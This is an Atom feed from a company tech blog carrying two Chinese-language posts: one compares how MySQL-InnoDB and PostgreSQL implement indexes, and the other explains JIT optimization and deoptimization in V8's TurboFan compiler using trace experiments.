<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
	<title>Cymetrics Tech Blog</title>
	<subtitle>Cymetrics Tech Blog</subtitle>
	
	<link href="https://tech-blog.cymetrics.io/feed/feed.xml" rel="self"/>
	<link href="https://tech-blog.cymetrics.io"/>
	<updated>2021-09-16T00:00:00-00:00</updated>
	<id>https://tech-blog.cymetrics.io</id>
	<author>
		<name>Cymetrics Tech Blog</name>
		<email></email>
	</author>
	
	<entry>
		<title>從Indexing的角度切入MySQL-Innodb與PostgreSQL的效能比較</title>
		<link href="https://tech-blog.cymetrics.io/posts/maxchiu/indexing/"/>
		<updated>2021-03-12T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/maxchiu/indexing/</id>
		<content type="html">
		  &lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/1__D99fysQ1Z0zfpa390g4QvQ.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果你用的資料庫是屬於 Relational Database ，在這個年代用SQL進行資料庫的存取已經變成一件理所當然的事了。MySQL 、PostgreSQL 、MsSQL…不論是開源抑或是由大廠主導的 SQL 專案都擁有各自的擁護者 。&lt;/p&gt;
&lt;p&gt;其實如果單純以使用與操作的角度去這些不同的資料庫的官網和 document 看過一圈，可能不太容易看出有什麼關鍵性的差異。然而儘管這些資料庫在表面上看起來都提供了類似 Function ，但是對於同樣的一個邏輯， 不同家的資料庫之間的底層的物理實作卻有不少大相徑庭的地方。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;這篇文章想要以 MySQL (在本文中所參考的儲存引擎為 innodb ) 和PostgreSQL 為例，來討論一些 Relational Database 在底層操作資料時的一些基本原理。 更確切地說，從DB系統管理Index的方式來切入。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h3 id=&quot;indexes-%3A-%E6%B1%BA%E5%AE%9A%E8%B3%87%E6%96%99%E5%AD%98%E5%8F%96%E9%80%9F%E5%BA%A6%E7%9A%84%E9%97%9C%E9%8D%B5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#indexes-%3A-%E6%B1%BA%E5%AE%9A%E8%B3%87%E6%96%99%E5%AD%98%E5%8F%96%E9%80%9F%E5%BA%A6%E7%9A%84%E9%97%9C%E9%8D%B5&quot;&gt;#&lt;/a&gt; Indexes : 決定資料存取速度的關鍵&lt;/h3&gt;
&lt;p&gt;首先來談談 MySQL 和 PostgreSQL 在資料儲存上最關鍵的差異 : Indexes 。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.tutorialspoint.com/mysql/mysql-indexes.htm&quot;&gt;網路上的教學&lt;/a&gt;都會說， 對於 table 中經常需要用來當作查詢依據的 column ，把它設成 index 速度就會提升。這背後的原因是因為對於資料庫背後儲存資料的 Data structure 來說 ，被選為 Index 的 Column 就會成為資料結構中的排序依據。&lt;/p&gt;
&lt;p&gt;“假設”某個資料庫背後是用 &lt;a href=&quot;https://en.wikipedia.org/wiki/Binary_tree&quot;&gt;Binary Tree&lt;/a&gt;（實際上通常是 &lt;a href=&quot;https://zh.wikipedia.org/wiki/B%E6%A0%91&quot;&gt;B-Tree&lt;/a&gt; 的各種延伸版本）來當作核心資料結構的話，一筆資料的 row 就是一個 node。 那例如說在下圖的資料結構，一筆資料會有Name、Height、id 三個欄位，那當我們把欄位 “ id” 設為 index的話 ，這棵樹（也就是資料庫存放資料的結構）就會照著 id 的值來排序。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__lAtWJh8SO8RBVIxR.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;看到這裡有自己設計過 DB Schema 的朋友們可能就會好奇，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“咦但是有時候我同一張 table 裡面會有好幾個 column 會設成 index 耶&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;那這樣資料庫要以哪個為基準排序啊？”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在討論這個問題前我們必須先瞭解兩個概念：clustered index 和 non-clustered index。&lt;/p&gt;
&lt;h3 id=&quot;clustered-index-%E8%88%87-non-clustered-index&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#clustered-index-%E8%88%87-non-clustered-index&quot;&gt;#&lt;/a&gt; Clustered Index 與 Non-Clustered Index&lt;/h3&gt;
&lt;p&gt;如果要用一句話概括說明這兩者的差異，可以說 Clustered Index 是“完整資料(包含所有 column）在 Storage 中實際上的排序依據 ” 而 Non-clustered Index則是 “跟完整資料分開來放的欄位子集合的排序依據”。&lt;/p&gt;
&lt;p&gt;說得白話一點就是完整的資料在 storage 裡面用 clustered-index 當作排序依據， clustered-index 相近的資料在 storage 中也會在比較接近的位置。 且因爲他是實際上 storage 在 partition 資料時的依據，所以只能有一個 clustered index。&lt;/p&gt;
&lt;p&gt;而資料庫會另外複製幾份被使用者選為 non-clustered index 的 column 資料， 在其他 storage 的空間創造只包含這些 non-clustered index 的資料結構。每多一個 index 就多創造一份。而這些 non-clustered index 跟實際上 storage中的資料的物理位置沒有直接的關連。&lt;/p&gt;
&lt;p&gt;以上面的例子為例， id（預設是 Primary Key）就是 clustered index ，而如果使用者在 name 和 height 上都 create index 的話（預設狀況 create 新的 index 就是 non-clustered index），資料庫會創造出額外的兩份複製的子集合資料結構。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__vIig59JPmcPAXOZ9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__vsWcHf9LzLOdY__D3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;這兩個新的 tree 分別各自以不同的 non-clustered index 進行排序.。當使用者要查詢資料時， 資料庫就會從判斷指令中的條件使用的欄位是否是有被設為index 的欄位，有的話就會從對應的 tree 裡面尋找。&lt;/p&gt;
&lt;p&gt;例如下 &lt;strong&gt;SELECT * WHERE Height &amp;gt; 165&lt;/strong&gt; ，資料庫不會從圖一中原本包含完整資料的結構中尋找， 而是會從複製出來的圖二的結構中尋找對應的 node。&lt;/p&gt;
&lt;p&gt;然而眼尖的朋友可能發現, 如果是**SELECT ***的話，就算在圖二的 tree 中找到了需要的 nodes，裡面也沒有包含其他欄位的資料讓我回傳啊！&lt;/p&gt;
&lt;p&gt;一個可能的解法是在 create index 時下&lt;strong&gt;INCLUDE&lt;/strong&gt; clause ，可以讓資料庫在創建新的 non-clustered index tree 時把被 include 的欄位資料一起放進去。 但是如果 table 中的欄位很多，那這樣每次要 create 新的 index 時創造出來的新的tree 就會無敵大，對 storage 是一個大負荷。&lt;/p&gt;
&lt;p&gt;所以實際上除了用 clustered index 排序的原本資料外，這些額外的 index tree的節點都還包括了一個 field，放的正是 clustered index。 例如圖二以 height 當non-clustered index 的 tree 中實際上會有額外對應的 clustered index (此例中也就是 id )&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__oM__jfRfuw6nkKmE5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SELECT * WHERE Height &amp;gt; 165&lt;/strong&gt;這個指令在查詢時就會變成先從此樹中找到符合條件的node，再用對應的clustered index(id)去圖一中的樹查詢。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__FgE15QZVAhf__hZhu.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;以上這個流程就是 ＭySQL-Innodb 中用 index 加速資料查詢的流程和原理&lt;/p&gt;
&lt;p&gt;看來很完美！ 收工～&lt;/p&gt;
&lt;p&gt;..&lt;/p&gt;
&lt;p&gt;…&lt;/p&gt;
&lt;p&gt;……&lt;/p&gt;
&lt;p&gt;然而現實總是殘酷的， 這樣的流程有個潛在的大問題。&lt;/p&gt;
&lt;p&gt;先從 non-clustered index 取得 clustered index 再去查詢，看起來只是從查詢一次變成兩次而已， 然而實際上如果進行非常大範圍的Range Query， non-clustered index一個range中對應的clustered-index資料在實際硬碟的存放位置是非常散亂的，這個查詢clustered-index tree的步驟會在Storage中發生非常巨量的Random Access,效能的大幅下降是可以預期。&lt;/p&gt;
&lt;p&gt;如果我們想要 Select 全部的欄位，但是卻不想要回去 clustered-index tree 裡面查詢， 有辦法嗎？&lt;/p&gt;
&lt;h3 id=&quot;postgresql%E7%9A%84%E8%A7%A3%E6%B3%95%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#postgresql%E7%9A%84%E8%A7%A3%E6%B3%95%EF%BC%9A&quot;&gt;#&lt;/a&gt; PostgreSQL的解法：&lt;/h3&gt;
&lt;p&gt;PostgreSQL看到了 MySQL-Innodb 中這樣的痛點， 所以在設計上採取了一個策略 ： 不使用 clustered index tree。&lt;/p&gt;
&lt;p&gt;沒有 clustered index 意味著的就是完整的原始資料無法進行排序（因為沒有排序的依據） 在 PostgreSQL 的中存放完整資料的地方稱之為 Heap。 這個Heap 是個無序的結構，每一筆資料存在 storage 中是不給予這些資料順序任何的保證的。&lt;/p&gt;
&lt;p&gt;而 non-clustered index 的部分,，PostgreSQL 則是從在每個 node 裡面儲存Clustered-index，改成儲存一個指向 Heap 中對應完整資料的 row 所在位置的指標. (注意此處的指標不是 memory 的指標，而是用來在資料庫中標記唯一所在位置的 &lt;a href=&quot;https://www.postgresql.org/docs/8.0/storage-page-layout.html&quot;&gt;Page&lt;/a&gt; 的資訊) *&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__y9JhQLyEkTuIgTJQ.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;看到這裡可能會有人想問,“那為何 MySQL不也直接在 Non-clustered index tree的 node 中存放指標就好了？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這點也正是 PostgreSQL 以 Heap 存放原始完整資料的主要原因. 因為 Heap 不保證資料順序,所以任何資料被 update 或 insert ，現有的其他資料都不需要變更存放的位置, 相較之下 Innodb 因為是依照 clustered index 來排序,任何資料的 clustered index 被更改或插入新的資料都會造成其他資料的存放位置依照index 發生相對應的變化。&lt;br&gt;
（以 B-Tree 來說, 會為了維持 tree 的 balance 而發生樹的結構的變化，因為clustered index 必須反映實際物理位置，所以 clustered index 順序更新必須同時更新 disk 中的資料位置, 造成大量的時間消耗）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__fHXzicHiDkxS1uTE.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;正是因為資料位置的不變的特性，讓 PostgreSQL 的指標實現成為可能。所以在PostgreSQL 中，用 Non-clustered index 查詢資料，不需要再跑去 clustered index tree 裡面查詢，直接拿指標位置去 storage 裡面對應的 Page 取出資料即可。&lt;/p&gt;
&lt;p&gt;然而這樣的設計並非沒有 Trade-Off 的。&lt;/p&gt;
&lt;p&gt;儘管在用 Non-clustered Index 進行 &lt;strong&gt;SELECT *&lt;/strong&gt; 之類的查詢時會因為少一次tree lookup 而有效率上的提升。但因為這種實現方式完全捨棄了 clustered-index，所以如果是用 primary key（以Innodb 來說就是 clustered index ） 來查詢， 反而會多了一個用指標查詢的步驟。&lt;/p&gt;
&lt;p&gt;且因為 Heap 沒有辦法保證任何資料在物理上的 Locality（在前面提過, clustered index 才有辦法保證 index 跟 storage 中物理位置的相似性），所以無法像 MySQL-Innodb 一樣以 clustered-index 進行 Range Query 時有Locality的優勢。&lt;/p&gt;
&lt;p&gt;綜上所述，我們大致可以把這兩種資料庫實現Indexing的方式用以下幾點歸納：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__ZXKx4__FyY7rop1wV.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;以剛剛包含了 id、 Name 跟 Height 的 table (person) 為例 ：（當然以下的前提都是資料的 rows 非常非常多的狀況，且我們把 id、Name、 Height 都 create Index）&lt;/p&gt;
&lt;p&gt;SELECT p.*&lt;br&gt;
FROM person p&lt;br&gt;
WHERE p.Height &amp;lt; 170;&lt;/p&gt;
&lt;p&gt;對這樣的指令來說， 因為要 Select 全部的欄位， 而查詢條件是 non-clustered index, 所以根據我們前面所說，因為 MySQL-Innodb 還必須去 clustered index tree 裡面搜尋一遍，是可以預期 PostgreSQL 是比較快的。&lt;/p&gt;
&lt;p&gt;SELECT p.*&lt;br&gt;
FROM person p&lt;br&gt;
WHERE &lt;a href=&quot;http://p.id/&quot;&gt;p.id&lt;/a&gt; &amp;gt; 18;&lt;/p&gt;
&lt;p&gt;這個指令，儘管要 Select 全部的欄位,但因為 id 是 clustered index， 用id來當作查詢條件時對 Innodb 來說就直接在 clusterd index tree 裡面搜尋了，找到就可直接回傳。而對 PostgreSQL 來說因為id仍然是 non-clusterd index (跟 Heap 分開的)， 所以 PostgreSQL 反而還會多了一次用指標去資料庫把資料撈出來的步驟。 因此這樣的操作是可以預期 MySQL 是有優勢的。&lt;/p&gt;
&lt;p&gt;SELECT &lt;a href=&quot;http://p.name/&quot;&gt;p.Name&lt;/a&gt;&lt;br&gt;
FROM person p&lt;br&gt;
WHERE &lt;a href=&quot;http://p.name/&quot;&gt;p.Name&lt;/a&gt; = &amp;quot;David&amp;quot;;&lt;/p&gt;
&lt;p&gt;至於這個指令，因為要回傳的 column 就是 non-clustered index，所以不論是Innodb 還是 PostgreSQL 都只要在查詢 non-clustered index tree 時直接回傳Name 就好了， 跟 Clustered Index tree 和 Heap 都沒關係，所以兩者的資料儲存方式不同不會讓這樣的查詢有太大效能差異。&lt;/p&gt;
&lt;h4 id=&quot;%E7%B5%90%E8%AB%96-%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96-%3A&quot;&gt;#&lt;/a&gt; 結論 :&lt;/h4&gt;
&lt;p&gt;一般來說如果用 Primary Key 來查詢時，因為 MySQL-Innodb 是用 Clustered-index， 所以速度較快，尤其在進行 Range Query 時因為 clustered-index在Storage 中的 locality，所以速度會大幅提升。&lt;/p&gt;
&lt;p&gt;而如果是需要經常對不同欄位進行檢索的 Table， 因為 PostgreSQL 在 non-clustered index 的資料結構的節點中有直接存放實際資料的位置，所以速度會比起要再次去 clustered index 資料結構查詢的 MySQL-Innodb來的快。&lt;/p&gt;
&lt;p&gt;另外，當要 select 的欄位全部都被 include 在 non-clustered index 的資料結構中時，理論上兩者的效率便不會有太大的差別。（不過， INCLUDE clause只支援 PostgreSQL11 以後的版本，因此如果 PostgreSQL 沒有 INCLUDE 的話Innodb 還是會快一些的）&lt;/p&gt;

		</content>
	</entry>
	
	<entry>
		<title>從編譯器優化角度初探 Javascript的V8 引擎</title>
		<link href="https://tech-blog.cymetrics.io/posts/maxchiu/turbofan/"/>
		<updated>2021-04-07T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/maxchiu/turbofan/</id>
		<content type="html">
		  &lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/1__NyZv46I1bYz4K7ngiT__W9Q.jpeg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;這篇文章想以V8引擎對於JS的實現為例來探討編譯器優化的一些基礎議題並搭配實驗，希望能讓讀者對於血汗的編譯器到底在背後幫我們完成了多少事情有點概念。&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;一般人對於 JS 這種 Scripting Language 的印象大概就是相比於 C++ 之類直接編譯成對應指令集的語言，因為是把 Source code 藉由 Interpreter 編譯成 跑在原生環境的 &lt;a href=&quot;https://en.wikipedia.org/wiki/Virtual_machine&quot;&gt;Process VM&lt;/a&gt; 上對應的 Bytecode，沒辦法直接在 Machine code 層級做優化，所以速度通常會慢了一截。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__6JLpKVtBq4eIEljk.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;雖然 Bytecode 這種做法在執行時期速度顯然會較慢，但把 Source code 編譯成 Bytecode 形式，不僅僅是具備了“編譯一次，各平台通用”的跨平台的特性，同時 Bytecode 的指令層級也因為比較 High level， 相比於精確繁瑣的 Machine 層級指令，編譯 Bytecode 的速度通常會快出許多。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__FK2W6kz9__36yXHnm.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__pq5o__C__DCDLht__XB.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;以上圖為例，一個 result = 1 + obj.x 這樣的 source code，隨著指令層級的越低，編譯的複雜度和時間也會隨之提升。然而越精確的指令對 CPU 來說才可以發揮最高的硬體效能。 所以其實要把 Source code 抽象到怎樣的層級就是設計編譯器時一個很重要的 Issue。&lt;/p&gt;
&lt;p&gt;而許多基於 Bytecode 的語言為了能夠提升效率，引入了所謂的 &lt;a href=&quot;https://zh.wikipedia.org/wiki/%E5%8D%B3%E6%99%82%E7%B7%A8%E8%AD%AF&quot;&gt;JIT&lt;/a&gt; 技術，透過在執行時期分析常被執行的片段，同步地把這些片段的 profileing data 在背後偷偷餵進 optimizing compiler ，編譯成 Machine code 後偷偷的替換掉原本 bytecode 以提升運行的速度。（可以是從 &lt;a href=&quot;https://www.google.com/search?q=abstract+syntax+tree&amp;amp;sxsrf=ALeKk02ELy_J6aRB-LjA0fdC8u6fBk-ITA%3A1617433965743&amp;amp;ei=bRVoYNz1LIOmmAXr6LfwBg&amp;amp;oq=abstract+syn&amp;amp;gs_lcp=Cgdnd3Mtd2l6EAEYADICCAAyAggAMgIIADICCAAyBQgAEMsBMgUIABDLATIFCAAQywEyBQgAEMsBMgUIABDLATIFCAAQywE6BAgjECc6BAgAEEM6BQgAELEDOggIABCxAxCDAToHCAAQsQMQQzoKCAAQsQMQRhD_AVDY_QhYtZAJYL2bCWgDcAB4AIABQIgBhQWSAQIxM5gBAKABAaoBB2d3cy13aXrAAQE&amp;amp;sclient=gws-wiz&quot;&gt;AST&lt;/a&gt; 也可以是從 Bytecode 優化）[2]&lt;/p&gt;
&lt;p&gt;V8 引擎目前所使用的 Optimizing Compiler叫做 &lt;a href=&quot;https://v8.dev/&quot;&gt;TurboFan&lt;/a&gt; ， 他使用了一套自訂的 IR [3] ，並用 Sea Of Nodes 取代傳統編譯器優化中使用的 CFG，大幅提升了優化策略的彈性，並實現了大部分語言都有的共通優化方式（ Inlining、Loop Splitting 、 Escape Analysis … etc )。(&lt;strong&gt;＊註一)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;具體來說， Turbofan 採用的是所謂的推測式優化（ Speculative Optimization ）。動態語言因為允許不指名變數型別，執行期的 Machine 指令理當是無法確定（舉最簡單的例子 ，“＋”這個 operator 在 String 跟 Number 行為完全不一樣），但 Turbofan 根據 Runtime 時的 Profiling 資訊，“推測” 一些這段 Source Code 確切的型別。以函式呼叫來說， Turbofan會在執行期的每個 Function的Code Object裡面都額外帶上所謂的 &lt;strong&gt;Feedback Vector[4]&lt;/strong&gt; ，用來統計一個函式的執行狀況。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0____DVw6OQA0S5z1Ryu.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我們考慮一個簡單的狀況&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__ec5paOPfU9S1XkoU.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;這樣的話函式為例，若執行期數十次對這個函式的呼叫傳入的都是Integer，那麼 Feedback Vector 就會開始統計這些資訊，Turbofan 會開始在背後同步地把 Add( x, y)的 Bytecode 轉換成針對 Integer 操作的指令。&lt;/p&gt;
&lt;p&gt;然而推測性的優化終究只是推測性的，過了一陣子如果User突然對 Add 函式傳進了一個 String，V8引擎是不是就要爆掉了？畢竟連 Machine code 都已經把它當成 Integer 來操作了，難道要噴 Segmentation Fault了？&lt;/p&gt;
&lt;p&gt;實際上 TurboFan 在處理 JIT 優化時，並不只是單純的把對應的 code 轉成 machine code ， 而是會同時在 Code 中塞入所謂的 Checkpoint，執行優化過的 Machine code 函式 之前，會先檢查傳入的參數是否跟先前的假設一致，若假設不成立了，則進行 Deoptimization。&lt;br&gt;
（這邊有個點要提醒，若 同一段 code Optimization-Deoptimization 這樣子的重複了五次以上，在 Turbofan 就會認定這是段 Megamorphic 的 Code，並放棄對他進行 JIT 優化）[7]&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__cSphl2MMRjAZlmi3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;從上圖可以看到，優化過的機器碼中，實際的函數內指令是黃色的部分，藍色部分檢查參數是否為 Small Integer 型別，橘色部分檢查 object 的 Hidden Class (＊註二）是否相同。 若不相同就直接 Jump 到對應的處理程式碼。&lt;/p&gt;
&lt;p&gt;具體來說， 為了能順利 fallback 回去用 Bytecode 執行，Deoptimization 要做以下幾件事：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;把目前 memory stack 中的 frame 和 Register 中的資訊存進 buffer&lt;/li&gt;
&lt;li&gt;從 (optimized) frame 中重構出 interpreter 的 frame，若優化後的 frame 是 inlined 的，則必須依序建構出正確的 function stack (畢竟 interpreter 是沒有辦法做 inlining 優化的啊啊）&lt;/li&gt;
&lt;li&gt;把 Register 的值讀進新的 stack 需要的位置 （有沒有感覺跟 Context Switch 在做的事有點像XD)&lt;/li&gt;
&lt;li&gt;重新 Materialize 那些被 Turbofan 用 &lt;a href=&quot;https://en.wikipedia.org/wiki/Escape_analysis&quot;&gt;Escape Analysis&lt;/a&gt; 優化省略掉的物件實例&lt;/li&gt;
&lt;li&gt;把 Program counter 跳回去給 Interpreter&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上這就是 V8引擎中所謂的 Eager Deoptimization。&lt;/p&gt;
&lt;p&gt;並且，若某個變數的 CheckPoint Fail了，所有其他會使用到同一個變數的函式也要 Deoptimize。然而實際上這些相依的函式因為不是在 Stack 的頂端，不能直接 Deoptimize ( 例如無法取得 register 的 snapshot )&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__WTJD__3E4soas9mJh.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;所以實務上 Turbofan 還有一招所謂的 Lazy Deoptimization。 在一開始編譯 Machine Code 時就會註冊函式和變數之間的 Dependency， 而若某一段code 改到了某個變數的 Shape，會在相依的函數中把原本要存取此變數的 code 區段先用一段 Patched instruction 替代。這個 instruction 的功用就是去呼叫Deoptimizer。這樣子我們就可以在執行到會出問題的片段時再去 Deoptimize了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0______KJ__E7A8zUnQ2BP.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;以上就是我們偉大的 Turbofan 大大在我們跑 JS Code 時一直勞心勞力在做的事情。講了這麼多理論上的東西我想大家可能還是有點茫然，以下就用幾個簡單的實驗來探討一些 Turbofan 幫我們做的事情。&lt;/p&gt;
&lt;p&gt;讓我們考慮以下這個簡單的程式片段 test.js&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__tzW02alSCz__NNYJD.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我們在 node 環境下執行 &lt;strong&gt;node — trace-opt — trace-deopt test.js | grep doSomething ，藉由 — trace-opt 和 — tract-deopt觀&lt;/strong&gt;察 V8 在執行時動態優化和反優化時的行為**，**並用 &lt;strong&gt;perf_hook&lt;/strong&gt; 紀錄執行時間 &lt;strong&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__ysU6PBHyDXMgEG4c.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__Uk6z7x4EsoOieT2J.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 Turbofan 確實在執行期間動態的去優化了 doSomething。 被 mark起來的 reason是 &lt;strong&gt;small function&lt;/strong&gt;，也就是說 Turbofan 覺得可以進行 inlining的優化。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Inlining 代表的是 假裝函式裡面的 code 像是直接在 caller 對函式的呼叫處展開。這樣的做法可以省略創建跟維護新的 stack frame 所需的時間。 TurboFan 中對於一個函式是否可以進行 Inlining 的標準可以參考 [9].&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/1__dBY1pw8ZHWqe__I__SfLGPyw.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;簡單來說，如果函式在 AST 中的 Node 數少於 200，且函式的 callstack 深度小於 5，就是一個合格的 Candidate。&lt;br&gt;
但程式中可能會有大量的 Candidate，如果全部都展開可能過度消耗資源，所以 Turbofan 會考量函式的 Relative Call Frequency。也就是說，從 callstack 最下面的函式的執行次數開始，依序乘上每個函數在父函數每次執行時被執行到的比例（而非直接看函式被執行的絕對次數）。 此值越高的函式會越優先被 Inlining。&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/1__Tll__Gz2BbaIIYreX4s0H1g.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;另外如果我們在上面的執行中把 — no-turbo-inlining flag 打開來，可以看到效能也有明顯的下降&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;接著我們把上面的 code 的第二個迴圈的型別改成 String。再重新執行一次。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__aD0KzOXJwDqy__rXO.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__Akv2Bje8G0v9ilEw.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;從上面這段 trace 可以看出來， Turbofan 對 doSomething 一樣先做了優化，接著因為參數型別不一致而進行了 Eager 的反優化（畢竟是傳入參數的問題，並不是動到了別的地方的 object ) 。並且在最後執行了 doSomething 函式裡面的 obj 的 &lt;strong&gt;Materialization&lt;/strong&gt;。[8]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Materialization 意味著的就是在優化時， Turbofan 把 obj 做了 “Escape Analysis” (De-materialization)，也就是說它分析了這段函式的執行狀況，認定 obj 這個物件從來都不會脫離當前的 scope。&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;不會脫離當前 scope 代表的意義就是其實沒有必要把 obj 放到 heap 去（放到 Heap 最重要的意義就是為了讓別的 frame 可以存取到）， 直接把 obj 裡的property 都變成 local variable 放到 stack 裡面，可以提昇操作速度（畢竟放到 heap 的話就變成要先從 stack 讀變數在 heap 的位置再去拿）。&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;舉例來說我們以上的 code 若做了 De-materialization，會變成這樣的形式&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/1__U__ToZYPMtzR8AZcc9cGqQA.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/max/DiveIntoTurbofan/0__iyespGXRfBRYgYUm.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;當然，這些優化是不能在 Bytecode 層級做的，所以既然要反優化，就表示我們必須把 obj 重新放回 heap ，這就是所謂的 Materialization。&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
